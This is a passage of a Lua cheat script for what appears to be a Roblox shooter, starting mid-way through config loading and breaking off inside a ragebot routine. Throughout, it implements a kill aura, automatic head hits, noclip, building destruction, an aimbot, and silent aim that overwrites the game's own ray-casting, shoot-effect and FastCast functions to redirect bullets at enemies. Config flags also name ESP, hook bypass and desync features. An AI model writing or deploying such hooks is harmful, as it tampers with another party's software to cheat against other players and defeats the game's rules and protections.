    _G.NEX_LC_VARS.currentSpeed = config.currentSpeed or 16
    _G.NEX_LC_VARS.noSlowEnabled = config.noSlowEnabled or false
    _G.NEX_LC_VARS.spinEnabled = config.spinEnabled or false
    _G.NEX_LC_VARS.spinSpeed = config.spinSpeed or 0
    _G.NEX_LC_VARS.perfMode = config.perfMode or false
    _G.NEX_LC_VARS.autoReloadEnabled = config.autoReloadEnabled or false
    _G.NEX_LC_VARS.friendList = config.friendList or {}
    _G.NEX_LC_VARS.ultraFOVEnabled = config.ultraFOVEnabled or false
    _G.NEX_LC_VARS.fovValue = config.fovValue or 120
    _G.NEX_LC_VARS.autoRepairEnabled = config.autoRepairEnabled or false
    _G.NEX_LC_VARS.repairRange = config.repairRange or 15
    _G.NEX_LC_VARS.repairSpeed = config.repairSpeed or 0.05
    _G.NEX_LC_VARS.bringAllEnabled = config.bringAllEnabled or false
    _G.NEX_LC_VARS.hookBypassEnabled = config.hookBypassEnabled or false
    _G.NEX_LC_VARS.burnEnabled = config.burnEnabled or false
    _G.NEX_LC_VARS.burnRange = config.burnRange or 30
    _G.NEX_LC_VARS.showTracers = config.showTracers or false
    _G.NEX_LC_VARS.esp2Enabled = config.esp2Enabled or false
    _G.NEX_LC_VARS.unlockFOVEnabled = config.unlockFOVEnabled or false
    _G.NEX_LC_VARS.noClipCamEnabled = config.noClipCamEnabled or false
    if config.remoteEventTrackerEnabled ~= nil then
        remoteEventTrackerEnabled = config.remoteEventTrackerEnabled
    end
    _G.NEX_LC_VARS.fastMeleeEnabled = config.fastMeleeEnabled or false
    _G.NEX_LC_VARS.bigHeadEnabled = config.bigHeadEnabled or false
    _G.NEX_LC_VARS.autoBlockEnabled = config.autoBlockEnabled or false
    _G.NEX_LC_VARS.desyncEnabled = config.desyncEnabled or false
    _G.NEX_LC_VARS.maxAttackCount = config.maxAttackCount or 1
    _G.NEX_LC_VARS.homelandLaserEnabled = config.homelandLaserEnabled or false
    _G.NEX_LC_VARS.bulletDodgeEnabled = config.bulletDodgeEnabled or false
    _G.NEX_LC_VARS.bulletDodge2Enabled = config.bulletDodge2Enabled or false
    bulletDodgeEnabled = _G.NEX_LC_VARS.bulletDodgeEnabled
    bulletDodge2Enabled = _G.NEX_LC_VARS.bulletDodge2Enabled
    _G.NEX_LC_VARS.jumpButtonEnabled = config.jumpButtonEnabled or false
    _G.NEX_LC_VARS.killBotEnabled = config.killBotEnabled or false
    _G.NEX_LC_VARS.killBotRange = config.killBotRange or 5
    _G.NEX_LC_VARS.killBotCD = config.killBotCD or 0.1
    speedThresholdEnabled = config.speedThresholdEnabled or false
    highlightEnabled = config.highlightEnabled or false
    useLightsaber = config.useLightsaber or false
    pickupPlayer = config.pickupPlayer or false
    sourceWeapon = config.sourceWeapon or "军刀"
    _G.NEX_LC_VARS.autoChargeEnabled = config.autoChargeEnabled or false
    lockBots = config.lockBots ~= nil and config.lockBots or true
    _G.NEX_LC_VARS.ESP_Enabled = config.ESP_Enabled or false
    _G.NEX_LC_VARS.ESP_Boxes = config.ESP_Boxes or false
    _G.NEX_LC_VARS.ESP_Names = config.ESP_Names or false
    _G.NEX_LC_VARS.ESP_Distance = config.ESP_Distance or false
    _G.NEX_LC_VARS.ESP_Tracers = config.ESP_Tracers or false
    _G.NEX_LC_VARS.ESP_AimLine = config.ESP_AimLine or false
    _G.NEX_LC_VARS.ESP_TeamCheck = config.ESP_TeamCheck or false
    _G.NEX_LC_VARS.ESP_Outline = config.ESP_Outline or false
    _G.NEX_LC_VARS.undergroundEnabled = config.undergroundEnabled or false
    _G.NEX_LC_VARS.teleportBehindEnabled = config.teleportBehindEnabled or false
    _G.NEX_LC_VARS.teleportBehindActive = config.teleportBehindActive or false
    _G.NEX_LC_VARS.teleportBehindContinuous = config.teleportBehindContinuous or false

    updateManualHit()
    updateKillAura()
    updateBreakBuildings()
    updateNoFall()
    updateAimbot()
    updateSilentAim()
    updateRagebotConnection()
    updateBodyCenter()
    updateAutoMark()
    toggleNoclip(_G.NEX_LC_VARS.noclipEnabled or false)
    updateSpeed()
    updateNoSlow()
    updateSpin()
    setPerfMode(_G.NEX_LC_VARS.perfMode or false)
    updateAutoReload()
    updateUltraFOV()
    updateAutoRepair()
    updateBringAll()
    updateHookBypass()
    updateBurn()
    updateJumpButton()
    updateUnlockFOV()
    updateNoClipCam()
    toggleRemoteEventTracker(remoteEventTrackerEnabled)
    updateFastMelee()
    updateBigHead()
    updateFastReload2()
    updateAutoBlock()
    if _G.NEX_LC_VARS.desyncEnabled then
        pcall(function() _G.NEX_LC_VARS.desyncMainToggle:SetValue(true) end)
        createGhostExtraUI()
        toggleGhostMode(true)
    else
        toggleGhostMode(false)
    end
    if _G.NEX_LC_VARS.homelandLaserEnabled then startHomelandLaser() else stopHomelandLaser() end
    updateDodge()
    updateKillBot()
    updateSpeedThreshold()
    updateHighlight()
    updateAutoCharge()
    if type(refreshAutoChargeUI) == "function" then refreshAutoChargeUI() end
    updatePrecisionState()
    updateESP()
    if _G.NEX_LC_VARS.undergroundEnabled then
        enableUndergroundFeature()
    else
        disableUndergroundFeature()
    end
    if _G.NEX_LC_VARS.teleportBehindEnabled then
        createTeleportBehindUI()
    else
        destroyTeleportBehindUI()
    end
    if _G.NEX_LC_VARS.teleportBehindContinuous then
        if teleportBehindContinuousConn == nil then
            teleportBehindContinuousConn = RunService.RenderStepped:Connect(teleportBehindContinuousLoop)
        end
    end

    -- 恢复 FlyCamera 速度和灵敏度
    if config.flyCameraSpeed then
        flyCameraSpeed = config.flyCameraSpeed
    end
    if config.flyCameraSensitivity then
        flyCameraSensitivity = config.flyCameraSensitivity
    end

    -- 恢复网格预设 Toggle 状态
    if config.selectedMeshPreset and meshPresetToggles then
        for presetName, toggle in pairs(meshPresetToggles) do
            if toggle.SetValue then
                local isActive = (config.selectedMeshPreset == "预设：" .. presetName)
                pcall(function() toggle:SetValue(isActive) end)
            end
        end
    end

    -- 恢复光剑和拿起玩家 Toggle
    if useLightsaberToggle and useLightsaberToggle.SetValue then
        pcall(function() useLightsaberToggle:SetValue(useLightsaber or false) end)
    end
    if pickupPlayerToggle and pickupPlayerToggle.SetValue then
        pcall(function() pickupPlayerToggle:SetValue(pickupPlayer or false) end)
    end

    -- 同步 WindUI ESP Toggle 状态
    if espMainToggle and espMainToggle.SetValue then
        pcall(function() espMainToggle:SetValue(_G.NEX_LC_VARS.ESP_Enabled or false) end)
    end

    -- 恢复主题
    if config.customThemeEnabled ~= nil then
        customThemeEnabled = config.customThemeEnabled
        themeConfigData.custom_theme_enabled = customThemeEnabled
        saveThemeConfig(themeConfigData)
        if customThemeEnabled then
            WindUI:AddTheme(CustomTheme)
            WindUI:SetTheme("Custom")
            pcall(function()
                Window:SetBackgroundImageTransparency(0.15)
                Window:SetBackground(savedBg)
            end)
        else
            WindUI:SetTheme("Indigo")
            pcall(function()
                Window:SetBackgroundImageTransparency(1)
                Window:SetBackground("")
            end)
        end
    end

    -- 恢复语言
    if config.currentLanguage then
        WindUI:SetLanguage(config.currentLanguage)
    end

    WindUI:Notify({ Title = "配置加载", Content = "已加载: " .. name, Duration = 2 })
end

noclipEnabled = false
noclipConn = nil

function enableNoclip()
    local char = localPlayer.Character
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
        end
    end
end

function disableNoclip()
    local char = localPlayer.Character
    if not char then return end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            part.CanCollide = true
        end
    end
end

function startNoclip()
    if noclipConn then noclipConn:Disconnect() end
    noclipConn = RunService.Stepped:Connect(function()
        if not noclipEnabled then return end
        enableNoclip()
    end)
end

function toggleNoclip(state)
    noclipEnabled = state
    if state then
        enableNoclip()
        startNoclip()
    else
        if noclipConn then
            noclipConn:Disconnect()
            noclipConn = nil
        end
        disableNoclip()
    end
end

localPlayer.CharacterAdded:Connect(function()
    if noclipEnabled then
        task.wait(0.3)
        enableNoclip()
    end
end)

function updateUnlockFOV()
    -- 占位：解除FOV上限
end

function updateNoClipCam()
    -- 占位：无碰撞相机
end

_G.NEX_LC_VARS.manualHitEnabled = false
_G.NEX_LC_VARS.hitCount = 3
_G.NEX_LC_VARS.hitDelay = 0.08
_G.NEX_LC_VARS.manualRange = 45
_G.NEX_LC_VARS.manualFOV = 180
_G.NEX_LC_VARS.manualHitConn = nil
_G.NEX_LC_VARS.enemyHealth = {}

function manualHitLoop()
    if not _G.NEX_LC_VARS.manualHitEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local rootCF = root.CFrame
    local lookVec = rootCF.LookVector
    local origin = root.Position
    local targets = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= localPlayer and not isTeammate(p) and p.Character then
            local h = p.Character:FindFirstChildOfClass("Humanoid")
            local head = p.Character:FindFirstChild("Head")
            if h and head then
                local dist = (origin - head.Position).Magnitude
                if dist > _G.NEX_LC_VARS.manualRange then continue end
                local dirToTarget = (head.Position - origin).Unit
                local angle = math.deg(math.acos(math.clamp(lookVec:Dot(dirToTarget), -1, 1)))
                if angle > _G.NEX_LC_VARS.manualFOV then continue end
                table.insert(targets, {player=p, head=head, hum=h, dist=dist})
            end
        end
    end
    table.sort(targets, function(a,b) return a.dist < b.dist end)
    for i, t in ipairs(targets) do
        local p = t.player
        local h = t.hum
        local head = t.head
        local last = _G.NEX_LC_VARS.enemyHealth[p]
        local curr = h.Health
        if last and curr < last and curr > 0 then
            for j = 1, _G.NEX_LC_VARS.hitCount do
                task.wait(_G.NEX_LC_VARS.hitDelay)
                smartSend("Humanoid", tool, head)
            end
        end
        _G.NEX_LC_VARS.enemyHealth[p] = curr
    end
end

function updateManualHit()
    if _G.NEX_LC_VARS.manualHitEnabled then
        if not _G.NEX_LC_VARS.manualHitConn then
            _G.NEX_LC_VARS.manualHitConn = RunService.Heartbeat:Connect(manualHitLoop)
            _G.NEX_LC_VARS.enemyHealth = {}
        end
    else
        if _G.NEX_LC_VARS.manualHitConn then
            _G.NEX_LC_VARS.manualHitConn:Disconnect()
            _G.NEX_LC_VARS.manualHitConn = nil
        end
    end
end

_G.NEX_LC_VARS.killAuraEnabled = false
_G.NEX_LC_VARS.killAuraConn = nil
_G.NEX_LC_VARS.killLast = 0
_G.NEX_LC_VARS.attackRange = 5
_G.NEX_LC_VARS.attackCD = 0.1
_G.NEX_LC_VARS.maxAttackCount = 1

function getClosestEnemiesInRange()
    local char = localPlayer.Character
    if not char then return {} end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return {} end
    local enemies = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if isEnemy(plr) and plr.Character then
            local eRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if eRoot and hum and hum.Health > 0 then
                local dist = (root.Position - eRoot.Position).Magnitude
                if dist <= _G.NEX_LC_VARS.attackRange then
                    table.insert(enemies, {player = plr, distance = dist, root = eRoot, hum = hum})
                end
            end
        end
    end
    table.sort(enemies, function(a,b) return a.distance < b.distance end)
    return enemies
end

function getAnyToolForKill()
    local char = localPlayer.Character
    if not char then return nil end
    
    local tool = char:FindFirstChildOfClass("Tool")
    if tool then return tool end
    
    if _G.NEX_LC_VARS.killAuraAllowEmptyHand then
        local bp = localPlayer:FindFirstChild("Backpack")
        if bp then
            tool = bp:FindFirstChildOfClass("Tool")
            if tool then return tool end
        end
    end
    
    return nil
end

function doKillAura()
    if not _G.NEX_LC_VARS.killAuraEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    local tool = getAnyToolForKill()
    if not tool then return end
    local enemies = getClosestEnemiesInRange()
    local count = math.min(#enemies, _G.NEX_LC_VARS.maxAttackCount or 1)
    if count == 0 then return end
    if os.clock() - _G.NEX_LC_VARS.killLast >= _G.NEX_LC_VARS.attackCD then
        _G.NEX_LC_VARS.killLast = os.clock()
        for i = 1, count do
            local target = enemies[i]
            if target and target.player and target.player.Character then
                local head = target.player.Character:FindFirstChild("Head")
                if head then
                    smartSend("Humanoid", tool, head)
                end
            end
        end
    end
end

function updateKillAura()
    if _G.NEX_LC_VARS.killAuraEnabled then
        if not _G.NEX_LC_VARS.killAuraConn then
            _G.NEX_LC_VARS.killAuraConn = RunService.Heartbeat:Connect(doKillAura)
        end
    else
        if _G.NEX_LC_VARS.killAuraConn then
            _G.NEX_LC_VARS.killAuraConn:Disconnect()
            _G.NEX_LC_VARS.killAuraConn = nil
        end
    end
end

_G.NEX_LC_VARS.breakBuildingsEnabled = false
_G.NEX_LC_VARS.breakBuildingsConn = nil
_G.NEX_LC_VARS.breakLast = 0
_G.NEX_LC_VARS.breakCD = 0.05
_G.NEX_LC_VARS.breakRange = 30

function doBreakBuildings()
    if not _G.NEX_LC_VARS.breakBuildingsEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local buildings = Workspace:FindFirstChild("BuildingsContainer")
    if not buildings then return end
    for _, building in ipairs(buildings:GetChildren()) do
        if building:IsA("Model") then
            local part = building:FindFirstChild("Invis") or building:FindFirstChild("Hitbox") or building.PrimaryPart
            if part and part:IsA("BasePart") and (root.Position - part.Position).Magnitude <= _G.NEX_LC_VARS.breakRange then
                if os.clock() - _G.NEX_LC_VARS.breakLast >= _G.NEX_LC_VARS.breakCD then
                    _G.NEX_LC_VARS.breakLast = os.clock()
                    smartSend("Construct", tool, part)
                end
            end
        end
    end
end

function updateBreakBuildings()
    if _G.NEX_LC_VARS.breakBuildingsEnabled then
        if not _G.NEX_LC_VARS.breakBuildingsConn then
            _G.NEX_LC_VARS.breakBuildingsConn = RunService.Heartbeat:Connect(doBreakBuildings)
        end
    else
        if _G.NEX_LC_VARS.breakBuildingsConn then
            _G.NEX_LC_VARS.breakBuildingsConn:Disconnect()
            _G.NEX_LC_VARS.breakBuildingsConn = nil
        end
    end
end

_G.NEX_LC_VARS.noFallEnabled = false
_G.NEX_LC_VARS.noFallConn = nil
local noFallFallingTimer = 0

function noFallLoop()
    if not _G.NEX_LC_VARS.noFallEnabled then return end
    local char = localPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end
    local vel = root.AssemblyLinearVelocity
    if vel.Y < -0.5 then
        noFallFallingTimer = noFallFallingTimer + 0.016
        if noFallFallingTimer >= 0.2 then
            pcall(function()
                hum:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
                hum:ChangeState(Enum.HumanoidStateType.Climbing)
            end)
        end
    else
        noFallFallingTimer = 0
        if hum:GetState() == Enum.HumanoidStateType.Climbing then
            pcall(function()
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
        end
    end
end

function updateNoFall()
    if _G.NEX_LC_VARS.noFallEnabled then
        if not _G.NEX_LC_VARS.noFallConn then
            noFallFallingTimer = 0
            _G.NEX_LC_VARS.noFallConn = RunService.Heartbeat:Connect(noFallLoop)
        end
    else
        if _G.NEX_LC_VARS.noFallConn then
            _G.NEX_LC_VARS.noFallConn:Disconnect()
            _G.NEX_LC_VARS.noFallConn = nil
        end
        noFallFallingTimer = 0
        local char = localPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum and hum:GetState() == Enum.HumanoidStateType.Climbing then
                pcall(function()
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end
        end
    end
end

_G.NEX_LC_VARS.aimbotEnabled = false
_G.NEX_LC_VARS.aimHead = false
_G.NEX_LC_VARS.aimRange = 300
_G.NEX_LC_VARS.aimSmooth = 0.5
_G.NEX_LC_VARS.aimbotConn = nil

local aimIndicatorGui = nil
local indicator = nil
local glow = nil
local distLabel = nil

function createAimIndicator()
    if aimIndicatorGui then return end
    aimIndicatorGui = Instance.new("ScreenGui")
    aimIndicatorGui.Name = "AimIndicatorGui"
    aimIndicatorGui.Parent = CoreGui
    aimIndicatorGui.ResetOnSpawn = false
    aimIndicatorGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    indicator = Instance.new("Frame")
    indicator.Size = UDim2.new(0, 12, 0, 12)
    indicator.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    indicator.BorderSizePixel = 0
    indicator.Visible = false
    indicator.ZIndex = 10
    indicator.Parent = aimIndicatorGui
    Instance.new("UICorner", indicator).CornerRadius = UDim.new(1, 0)

    glow = Instance.new("Frame")
    glow.Size = UDim2.new(0, 20, 0, 20)
    glow.Position = UDim2.new(0.5, -10, 0.5, -10)
    glow.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    glow.BackgroundTransparency = 0.7
    glow.BorderSizePixel = 0
    glow.ZIndex = -1
    glow.Parent = indicator
    Instance.new("UICorner", glow).CornerRadius = UDim.new(1, 0)

    distLabel = Instance.new("TextLabel")
    distLabel.Size = UDim2.new(0, 60, 0, 14)
    distLabel.Position = UDim2.new(0.5, -30, 0, -18)
    distLabel.BackgroundTransparency = 1
    distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    distLabel.Font = Enum.Font.GothamBold
    distLabel.TextSize = 10
    distLabel.TextStrokeTransparency = 0.5
    distLabel.Text = ""
    distLabel.Parent = indicator
end

function destroyAimIndicator()
    if aimIndicatorGui then
        aimIndicatorGui:Destroy()
        aimIndicatorGui = nil
        indicator = nil
        glow = nil
        distLabel = nil
    end
end

function getClosestEnemyForAim()
    local char = localPlayer.Character
    if not char then return nil, nil end
    local cam = Workspace.CurrentCamera
    if not cam then return nil, nil end

    local bestClear, bestDistClear = nil, math.huge
    local bestNearWall, bestDistNearWall = nil, math.huge
    local screenCenter = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)

    for _, p in ipairs(Players:GetPlayers()) do
        if p == localPlayer then continue end
        if not isEnemy(p) then continue end
        local c = p.Character
        if not c then continue end
        local head = c:FindFirstChild("Head")
        local hum = c:FindFirstChildOfClass("Humanoid")
        if not head or not hum or hum.Health <= 0 then continue end

        local pos, onScreen = cam:WorldToViewportPoint(head.Position)
        if not onScreen then continue end

        local screenDist = (screenCenter - Vector2.new(pos.X, pos.Y)).Magnitude
        if screenDist > _G.NEX_LC_VARS.aimRange then continue end

        local wallCheck = _G.NEX_LC_VARS.wallCheckEnabled or false
        if wallCheck then
            local dist3D = (cam.CFrame.Position - head.Position).Magnitude
            local rayOrigin = cam.CFrame.Position
            local rayDir = (head.Position - rayOrigin).Unit * dist3D
            local params = RaycastParams.new()
            params.FilterType = Enum.RaycastFilterType.Exclude
            params.FilterDescendantsInstances = {char}
            local result = Workspace:Raycast(rayOrigin, rayDir, params)
            if result and result.Instance:IsDescendantOf(c) then
                if screenDist < bestDistClear then
                    bestDistClear = screenDist
                    bestClear = {Position = head.Position, Distance = dist3D}
                end
            elseif result then
                local distToEnemy = (result.Position - head.Position).Magnitude
                if distToEnemy < 5 then
                    if screenDist < bestDistNearWall then
                        bestDistNearWall = screenDist
                        bestNearWall = {Position = head.Position, Distance = dist3D}
                    end
                end
            else
                if screenDist < bestDistClear then
                    bestDistClear = screenDist
                    bestClear = {Position = head.Position, Distance = dist3D}
                end
            end
        else
            if screenDist < bestDistClear then
                bestDistClear = screenDist
                bestClear = {Position = head.Position, Distance = (cam.CFrame.Position - head.Position).Magnitude}
            end
        end
    end

    local target = bestClear or bestNearWall
    if target then
        return target.Position, target.Distance
    end
    return nil, nil
end

function aimbotLoop()
    if not _G.NEX_LC_VARS.aimbotEnabled then
        if indicator then indicator.Visible = false end
        return
    end

    local tool = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Tool")
    local isAiming = tool and tool:GetAttribute("isAiming")
    if not isAiming then
        if indicator then indicator.Visible = false end
        return
    end

    local cam = Workspace.CurrentCamera
    if not cam then return end

    local targetPos, dist = getClosestEnemyForAim()
    if targetPos then
        if indicator and distLabel then
            local screenPos, onScreen = cam:WorldToViewportPoint(targetPos)
            if onScreen then
                indicator.Visible = true
                indicator.Position = UDim2.new(0, screenPos.X - 6, 0, screenPos.Y - 6)
                distLabel.Text = math.floor(dist) .. "m"
                local targetCF = CFrame.new(cam.CFrame.Position, targetPos)
                cam.CFrame = cam.CFrame:Lerp(targetCF, _G.NEX_LC_VARS.aimSmooth)
            else
                indicator.Visible = false
            end
        end
    else
        if indicator then indicator.Visible = false end
    end
end

function updateAimbot()
    if _G.NEX_LC_VARS.aimbotEnabled then
        if not _G.NEX_LC_VARS.aimbotConn then
            createAimIndicator()
            _G.NEX_LC_VARS.aimbotConn = RunService.RenderStepped:Connect(aimbotLoop)
        end
    else
        if _G.NEX_LC_VARS.aimbotConn then
            _G.NEX_LC_VARS.aimbotConn:Disconnect()
            _G.NEX_LC_VARS.aimbotConn = nil
        end
        destroyAimIndicator()
    end
    updatePrecisionState()
end

local silentBeamFolder = nil

local function createSilentBeam(from, to, color)
    if not _G.NEX_LC_VARS.showTracers then return end
    if not silentBeamFolder then
        silentBeamFolder = Instance.new("Folder")
        silentBeamFolder.Name = "SilentBeams"
        silentBeamFolder.Parent = Workspace
    end
    local beam = Instance.new("Beam", silentBeamFolder)
    beam.Width0 = 2
    beam.Width1 = 2
    beam.Color = ColorSequence.new(color or Color3.fromRGB(255, 50, 255))
    beam.Transparency = NumberSequence.new(0.2)
    beam.FaceCamera = true

    local att0 = Instance.new("Attachment", silentBeamFolder)
    att0.WorldPosition = from
    local att1 = Instance.new("Attachment", silentBeamFolder)
    att1.WorldPosition = to

    beam.Attachment0 = att0
    beam.Attachment1 = att1

    task.delay(0.5, function()
        pcall(function()
            beam:Destroy()
            att0:Destroy()
            att1:Destroy()
        end)
    end)
end

local function getClosestForSilent()
    local char = localPlayer.Character
    if not char then return nil end
    local cam = Workspace.CurrentCamera
    if not cam then return nil end

    local bestClear, bestDistClear = nil, math.huge
    local bestNearWall, bestDistNearWall = nil, math.huge
    local screenCenter = Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)

    local function checkTarget(targetChar, targetHead, isBot)
        if not targetHead or not targetHead.Parent then return end
        local hum = targetChar:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end

        local d = (cam.CFrame.Position - targetHead.Position).Magnitude

        -- FOV限制检查
        if _G.NEX_LC_VARS.silentFovEnabled then
            local screenPos, onScreen = cam:WorldToViewportPoint(targetHead.Position)
            if not onScreen then return end
            local screenDist = (screenCenter - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
            if screenDist > _G.NEX_LC_VARS.aimRange then return end
        end

        local aimTarget = targetHead.Position - Vector3.new(0, 0.3, 0)

        if d < 10 then
            if d < bestDistClear then
                bestDistClear = d
                bestClear = {Part = targetHead, Position = aimTarget, wallStatus = "clear", isBot = isBot}
            end
        elseif _G.NEX_LC_VARS.wallCheckEnabled then
            local rayOrigin = cam.CFrame.Position
            local rayDir = (aimTarget - rayOrigin).Unit * d
            local rayParams = RaycastParams.new()
            rayParams.FilterType = Enum.RaycastFilterType.Exclude
            rayParams.FilterDescendantsInstances = {char}
            local result = Workspace:Raycast(rayOrigin, rayDir, rayParams)

            if result and result.Instance:IsDescendantOf(targetChar) then
                if d < bestDistClear then
                    bestDistClear = d
                    bestClear = {Part = targetHead, Position = aimTarget, wallStatus = "clear", isBot = isBot}
                end
            elseif result then
                local distToEnemy = (result.Position - targetHead.Position).Magnitude
                if distToEnemy < 8 then
                    if d < bestDistNearWall then
                        bestDistNearWall = d
                        bestNearWall = {Part = targetHead, Position = aimTarget, wallStatus = "near", isBot = isBot}
                    end
                end
            else
                if d < bestDistClear then
                    bestDistClear = d
                    bestClear = {Part = targetHead, Position = aimTarget, wallStatus = "clear", isBot = isBot}
                end
            end
        else
            if d < bestDistClear then
                bestDistClear = d
                bestClear = {Part = targetHead, Position = aimTarget, wallStatus = "clear", isBot = isBot}
            end
        end
    end

    -- 检查玩家
    for _, p in ipairs(Players:GetPlayers()) do
        if p == localPlayer then continue end
        if not isEnemy(p) then continue end
        local c = p.Character
        if not c then continue end
        checkTarget(c, c:FindFirstChild("Head"), false)
    end

    -- 检查AI/Bots（如果启用）
    if lockBots then
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
                if not Players:GetPlayerFromCharacter(v) then
                    checkTarget(v, v:FindFirstChild("Head"), true)
                end
            end
        end
    end

    return bestClear or bestNearWall
end
function enableSilentHook()
    if silentHookActive then return end
    local CrossPlatformMethods = pcall(require, ReplicatedStorage.MODULES.CrossPlatformMethods) and require(ReplicatedStorage.MODULES.CrossPlatformMethods)
    local ProjectileUtility = pcall(require, ReplicatedStorage.MODULES.ProjectileUtility) and require(ReplicatedStorage.MODULES.ProjectileUtility)

    if CrossPlatformMethods and CrossPlatformMethods.GetViewportRay then
        oldGetViewportRay = CrossPlatformMethods.GetViewportRay
        CrossPlatformMethods.GetViewportRay = function(self, ...)
            if _G.NEX_LC_VARS.silentAimEnabled then
                local t = getClosestForSilent()
                if t then
                    return {Position = t.Position, Instance = t.Part, Normal = Vector3.new(0,1,0)}
                end
            end
            return oldGetViewportRay(self, ...)
        end
    end

    if ProjectileUtility and ProjectileUtility.CreateShootEffect then
        oldCreateShootEffect = ProjectileUtility.CreateShootEffect
        ProjectileUtility.CreateShootEffect = function(self, gun, bulletOrigin, bulletBegin, targetPosition, ...)
            if _G.NEX_LC_VARS.silentAimEnabled then
                local t = getClosestForSilent()
                if t then
                    local color = t.wallStatus == "clear" and Color3.fromRGB(255, 50, 255) or Color3.fromRGB(255, 150, 0)
                    createSilentBeam(bulletOrigin or bulletBegin, t.Position, color)
                    targetPosition = t.Position
                end
            end
            return oldCreateShootEffect(self, gun, bulletOrigin, bulletBegin, targetPosition, ...)
        end
    end
    silentHookActive = true
end

function disableSilentHook()
    if not silentHookActive then return end
    local CrossPlatformMethods = pcall(require, ReplicatedStorage.MODULES.CrossPlatformMethods) and require(ReplicatedStorage.MODULES.CrossPlatformMethods)
    local ProjectileUtility = pcall(require, ReplicatedStorage.MODULES.ProjectileUtility) and require(ReplicatedStorage.MODULES.ProjectileUtility)

    if CrossPlatformMethods and oldGetViewportRay then
        CrossPlatformMethods.GetViewportRay = oldGetViewportRay
        oldGetViewportRay = nil
    end
    if ProjectileUtility and oldCreateShootEffect then
        ProjectileUtility.CreateShootEffect = oldCreateShootEffect
        oldCreateShootEffect = nil
    end
    if silentBeamFolder then
        silentBeamFolder:Destroy()
        silentBeamFolder = nil
    end
    silentHookActive = false
end

function updateSilentAim()
    if _G.NEX_LC_VARS.silentAimEnabled then
        enableSilentHook()
    else
        disableSilentHook()
    end
end

precisionEnabled = false
precisionHooked = false
lockPlayers = true
lockBots = true

function installPrecisionSilent()
    if precisionHooked then return end
    precisionHooked = true
    pcall(function()
        local fastCast = require(ReplicatedStorage.MODULES.FastCastRedux)
        if fastCast and fastCast.Fire then
            local oldFire = fastCast.Fire
            fastCast.Fire = function(self, ...)
                if ghostMode and ghostTarget and ghostTarget.Parent then
                    local args = {...}
                    if #args >= 2 then
                        args[2] = (ghostTarget.Position - args[1]).Unit * (ghostTarget.Position - args[1]).Magnitude
                    end
                    return oldFire(self, unpack(args))
                end
                if precisionEnabled then
                    local cam = Camera
                    if not cam then return oldFire(self, ...) end
                    local best, bestDist = nil, math.huge
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p ~= localPlayer and not isTeammate(p) and p.Character then
                            local head = p.Character:FindFirstChild("Head")
                            local hum = p.Character:FindFirstChildOfClass("Humanoid")
                            if head and hum and hum.Health > 0 then
                                local d = (cam.CFrame.Position - head.Position).Magnitude
                                if d < bestDist then bestDist = d; best = head end
                            end
                        end
                    end
                    if lockBots and _G.NEX_LC_VARS.silentAimEnabled then
                        for _, v in ipairs(Workspace:GetDescendants()) do
                            if v:IsA("Model") and v:FindFirstChildOfClass("Humanoid") and v:FindFirstChild("Head") then
                                if not Players:GetPlayerFromCharacter(v) then
                                    local hum = v:FindFirstChildOfClass("Humanoid")
                                    local head = v:FindFirstChild("Head")
                                    if hum and hum.Health > 0 and head then
                                        local d = (cam.CFrame.Position - head.Position).Magnitude
                                        if d < bestDist then bestDist = d; best = head end
                                    end
                                end
                            end
                        end
                    end
                    if best then
                        local args = {...}
                        if #args >= 2 then
                            args[2] = (best.Position - args[1]).Unit * (best.Position - args[1]).Magnitude
                        end
                        return oldFire(self, unpack(args))
                    end
                end
                return oldFire(self, ...)
            end
        end
    end)
end

function updatePrecisionState()
    local shouldEnable = _G.NEX_LC_VARS.aimbotEnabled or _G.NEX_LC_VARS.desyncEnabled
    if shouldEnable then
        precisionEnabled = true
        installPrecisionSilent()
    else
        precisionEnabled = false
    end
end

_G.NEX_LC_VARS.ragebotEnabled = false
_G.NEX_LC_VARS.ragebotConn = nil
_G.NEX_LC_VARS.lastRageShot = 0
_G.NEX_LC_VARS.rageInterval = 6.0
_G.NEX_LC_VARS.rageTargetPart = "Head"
_G.NEX_LC_VARS.rageSpecificTarget = ""
_G.NEX_LC_VARS.rageWhitelist = ""
_G.NEX_LC_VARS.rageWallCheck = false

local NaN = 0/0
local nanVec = Vector3.new(NaN, NaN, NaN)
local gunShoot, gunHit = nil, nil
local rageBotCache = {}
local lastRageCacheUpdate = 0
local lastRageTarget = nil
local rageTargetUpdateTime = 0
local rageKillCount = 0

local function initRagePackets()
    local success, result = pcall(function()
        local bytenetStorage = ReplicatedStorage:FindFirstChild("BytenetStorage")
        if not bytenetStorage then return nil end
